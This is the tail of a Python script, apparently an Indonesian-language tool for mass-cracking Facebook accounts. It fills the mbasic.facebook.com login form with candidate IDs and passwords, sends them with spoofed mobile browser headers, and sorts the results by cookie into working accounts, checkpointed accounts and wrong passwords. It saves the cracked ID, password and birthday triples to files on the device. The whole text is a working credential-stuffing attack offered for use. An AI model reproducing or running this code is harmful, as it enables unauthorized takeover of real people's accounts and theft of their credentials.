			head={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="67", "Chromium";v="67"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/?locale=id_ID&_rdr','accept-language': 'en-US;q=0.8,en;q=0.7'}
			a=sop(req.get('https://mbasic.facebook.com/?locale=id_ID&_rdr').text,'html.parser')
			porm=a.find('form')
			dataa = {}
			lion = ['lsd','jazoest','m_ts','li','try_number','unrecognized_tries','email','pass','login','bi_xrwh']
			for anj in porm('input'):
				if anj.get('name') in lion:
					if 'pass' ==anj.get('name'):
						dataa.update({anj.get('name'): pw})
					elif 'email' in anj.get('name'):
						dataa.update({anj.get('name'): id})
					else:
						dataa.update({anj.get('name'):anj.get('value')})
			b=sop(req.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=id_ID&refid=8',data=dataa,headers=head,allow_redirects=True).text,'html.parser')
			coki=req.cookies.get_dict()
			if "checkpoint" in req.cookies.get_dict().keys():
				try:
					ampromm=b.find('form')
					amdat=['fb_dtsg','fb_dtsg','jazoest','jazoest','checkpoint_data=','submit[Continue]','nh']
					amdata={}
					for enj in ampromm('input'):
						if enj.get('name') in amdat:
							amdata.update({enj.get('name'):enj.get('value')})
					cc=req.post('https://mbasic.facebook.com/login/checkpoint/?locale2=id_ID', cookies=coki, headers=head,data=amdata).text
					c=sop(cc,'html.parser')
					opsi=c.find_all('optiokn')
					no=1
					opsinya=''
					for opsii in opsi:
						opsinya+=f'	[{no}] {opsii.text} \n'
						no+=1
					print('\n\r')
					if opsinya=='':
						try:
							open('/sdcard/4MBF-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
						except:
							open('/sdcard/4MBF-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
					else:
						try:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
							open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
						except:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
							open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(id+'|'+pw+'\n')
					statusok1 = nel(statusok, style='yellow')
					cetak(nel(statusok1, title='CHECKPOINT OPTION'))
				except:
					li = '# TIDAK DAPAT MENGECEK OPSI'
					sol().print(mark(li, style='red'))
					exit()
			elif "c_user" in req.cookies.get_dict().keys():
				try:
					statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
				except:
					statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}'
				statusok1 = nel(statusok, style='yellow')
				cetak(nel(statusok1, title='CHECKPOINT OPTION'))
				open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(id+'|'+pw+'\n')

			else:
				print('\n\r')
				statusok = f'\r[•] ID : {id} [•] PASSWORD : {pw}'
				statusok1 = nel(statusok, style='red')
				cetak(nel(statusok1, title='WRONG PASSWORD'))
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
if __name__=='__main__':
	try:os.mkdir('/sdcard/4MBF-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/4MBF-DATA/OK')
	except:pass
	try:os.mkdir('/sdcard/4MBF-DATA/DUMP')
	except:pass
	login()
